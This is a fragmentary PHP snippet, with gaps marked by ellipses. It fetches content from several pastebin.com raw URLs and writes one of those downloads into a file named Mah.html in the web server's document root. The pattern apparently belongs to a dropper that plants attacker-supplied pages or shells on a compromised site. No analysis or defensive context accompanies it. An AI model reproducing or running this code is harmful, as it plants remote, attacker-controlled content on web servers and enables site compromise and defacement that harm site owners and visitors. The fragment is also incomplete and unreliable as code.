...
$text0 = http_get('http://pastebin.com/raw/0Xr9xGg3');
...
$text2 = http_get('http://pastebin.com/raw/wjaAeVpP');
...
echo "not exits";
echo "done .\n " ;
$check3=$_SERVER['DOCUMENT_ROOT'] . "/Mah.html" ;
$text3 = http_get('http://pastebin.com/raw/jJBehgu7');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
...
$text5 = http_get('http://pastebin.com/raw/NWxKGhjq');
...
$text6 = http_get('http://pastebin.com/raw/FUcZhfrn');
